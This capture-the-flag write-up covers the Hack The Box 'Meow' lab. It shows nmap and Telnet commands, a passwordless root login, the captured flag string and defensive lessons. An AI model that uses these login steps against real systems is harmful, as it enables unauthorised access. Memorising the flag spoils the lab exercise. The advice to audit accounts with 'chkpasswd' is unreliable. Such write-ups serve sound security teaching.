# Meow

**OS:** Linux | **Difficulty:** Very Easy | **Date:** 03/04/2026

## Summary

Meow was a **Very Easy** machine that demonstrated critical risks of insecure network service configurations. The exploitation was straightforward: identification of an exposed Telnet service and root access without authentication.

**Key points:**
- Telnet service (port 23) exposed without strong authentication
- Root account accessible with no password set
- Basic misconfiguration allowing full system access

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.124.197
```

**Result:**

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Nmap scan](screenshots/nmap%20command.png)

The scan revealed only one open port: **23/tcp** running Telnet.

## Enumeration

With the Telnet service identified, direct access was tested:

```bash
telnet 10.129.124.197 23
```

During enumeration, it was discovered that:
- The Telnet service was accepting connections
- The **root** account had no password set
- It was possible to log in directly as root without authentication

## Exploitation

### Initial Access

Access to the machine was obtained directly as root via Telnet:

```bash
telnet 10.129.124.197 23
# Login: root
# Password: <empty>
```

![Telnet session](screenshots/telnet.png)

### Flag Collection

After login, the flag was located and read directly:

```bash
cat flag.txt
```

## Privilege Escalation

N/A

## Flags

- **Flag:** `HTB{b40abdfe23665f766f9c61ecba8a4c19}`

## Lessons Learned

- **Vulnerability:** Telnet transmits all data in plaintext including credentials, and the root account had no password set — a critical misconfiguration granting immediate full access
- **Real world:** Legacy network equipment (routers, switches, industrial systems) often still ships with Telnet enabled and default/empty credentials, making this a common finding in internal pentests
- **Defense:** Disable Telnet entirely and replace with SSH; enforce password policies that prevent empty passwords; audit accounts with `chkpasswd`; restrict management interfaces to dedicated VLANs

### Useful Commands

```bash
# Nmap scan for port discovery
nmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt 10.129.124.197
```

```bash
# Telnet connection
telnet 10.129.124.197
```
